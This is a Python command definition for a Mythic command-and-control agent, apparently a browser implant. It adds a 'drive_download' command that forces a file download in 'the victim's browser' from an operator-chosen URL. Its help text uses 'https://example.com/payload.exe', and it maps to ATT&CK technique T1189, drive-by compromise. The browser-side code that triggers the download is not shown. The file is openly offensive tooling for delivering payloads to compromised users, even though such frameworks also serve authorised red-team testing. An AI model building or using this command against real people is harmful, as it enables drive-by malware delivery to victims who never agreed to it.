from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class DriveDownloadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL of the file to download to the victim's browser",
            ),
            CommandParameter(
                name="filename",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="",
                description="Filename for the downloaded file (auto-detected from URL if blank)",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a URL")
        if self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("url", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class DriveDownloadCommand(CommandBase):
    cmd = "drive_download"
    needs_admin = False
    help_cmd = "drive_download https://example.com/payload.exe"
    description = "Trigger a file download in the victim's browser from a URL. Tries fetch+blob first for reliable filename control, falls back to direct anchor click."
    version = 1
    author = "@grampae"
    attackmapping = ["T1189"]
    argument_class = DriveDownloadArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.MacOS, SupportedOS.Linux, SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        url = task.args.get_arg("url")
        filename = task.args.get_arg("filename")
        if filename:
            task.display_params = "{} as {}".format(url, filename)
        else:
            task.display_params = url
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
